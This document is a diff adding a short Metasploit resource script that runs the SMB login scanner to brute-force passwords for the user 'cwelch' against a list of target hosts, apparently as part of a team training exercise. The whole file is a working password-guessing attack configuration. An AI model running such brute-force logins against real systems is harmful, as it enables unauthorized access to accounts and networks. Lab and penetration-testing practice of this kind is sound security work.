@@ -1,0 +1,6 @@
+use auxiliary/scanner/smb/smb_login
+set ABORT_ON_LOCKOUT true
+set PASS_FILE /root/Desktop/Excercise_1/passwords
+set SMBUser cwelch
+set RHOSTS /root/Desktop/Excercise_1/Team_5/smbBoxes
+exploit
